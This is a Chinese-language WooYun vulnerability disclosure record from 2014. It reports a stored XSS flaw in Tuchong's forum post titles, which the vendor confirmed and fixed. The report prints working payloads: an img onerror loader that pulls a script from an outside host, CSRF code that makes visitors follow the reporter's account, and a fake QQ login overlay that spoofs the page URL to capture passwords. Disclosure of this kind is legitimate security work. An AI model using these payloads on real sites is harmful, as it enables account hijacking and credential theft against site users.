{"id": 52689, "wybug_id": "wooyun-2014-070457", "wybug_title": "图虫网存储型XSS + CSRF + Phishing 即使有httponly 照样玩的飞起", "wybug_corp": "图虫网", "wybug_author": "0x_Jin", "wybug_date": "2014-07-31 15:21", "wybug_open_date": "2014-09-14 15:22", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "类型应用", "利用技巧", "黑盒测试技巧", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向公众公开  简要描述： 之前有蛮多图虫的存储型XSS的 但是都差不多忘了 今天又去找了找。。。但是忘记你们做了httponly了 但是木有关系 即使这样 还有csrf 等等可以玩  详细说明：  在图虫首页 - 讨论 选择任意一个社区 - 发帖子在标题处 填入 xss payload （在帖子本身的界面已做过滤 在帖子综合界面没做过滤）上图吧：未做过滤\n\n\n\n已做过滤的帖子本身界面：\n\n再截图一下csrf发出去的包：\n\n再截图一下关注者的界面：\n\n危害不止这么一点点喔。。不要以为做了http only 就安全了。。。xss还可以做钓鱼哦 亲~  由于我不是真的想去钓鱼tuchong 我就拿qq空间钓鱼的模板来演示下把上张图吧：\n\n这个也是用html+css写出来的 稍微花点时间 改改就可以改的跟你们首页的登录框一模一样！连接在此：http://photogear.tuchong.com/XSS代码贴上：<img src=x onerror=jQuery.getScript('hook Address') width=0px> (不让图片显示出来)csrf代码贴上：var csrf = function(){   \tvar target=\"http://capa.tuchong.com/api/site/follow/\";    var siteid=\"site_id=377467\";\txss.csrf(target,siteid);   };   if('xss' in window){\t\tcsrf();   }else{\t\tvar s = document.createElement('script');\t\ts.onload = csrf;\t\ts.src = '//pujun.li/xss.js';\t\tdocument.body.appendChild(s);   }钓鱼代码贴上：location.href='javascript:\\'<html><head></head><body><div style=\"position: absolute; top: 322px; left: 599px; width: 402px; height: 256px; z-index: 9999; background-image: url(http://xssreport.sinaapp.com/t/qbg.png); background-position: initial initial; background-repeat: no-repeat no-repeat;\"><input type=\"text\" style=\"position:absolute;top:50px;left:108px;border:none;width:197px;height:24px;line-height:24px;\" id=\"user\"><input type=\"password\" style=\"position:absolute;top:92px;left:108px;border:none;width:197px;height:24px;line-height:24px;\" id=\"pass\"><div onclick=\"sendlogin()\" style=\"position:absolute;top:136px;left:105px;border:none;width:101px;height:28px;cursor:pointer;\"></div><img id=\"upic\" style=\"display:none\"></div></body></html>\\'';history.pushState({},\"xxx\",\"/cgi-bin/loginpage\");   漏洞证明：  http://pentax.tuchong.com/http://tuchong.com/642/http://tuchong.com/643/钓鱼连接：http://photogear.tuchong.com/虽然访问上面任意一个连接都会发出关注我的包。。。   修复方案：  在帖子本身界面过滤  在帖子显示标题的界面也要过滤哦 亲~ 给个高分吧 图虫的前端漏洞还蛮多的！输入输出进行过滤！一个存储型xss能做很多事情。。。什么获取内网ip 扫描内网 获取网页截图 以及环境信息就不演示了 毕竟这只是一个sns应用的xss   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-08-01 13:58 厂商回复： 已经修复，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-31 15:24 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  审核员 你再把我太平洋的跟瑞丽的存储型XSS审核了把~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}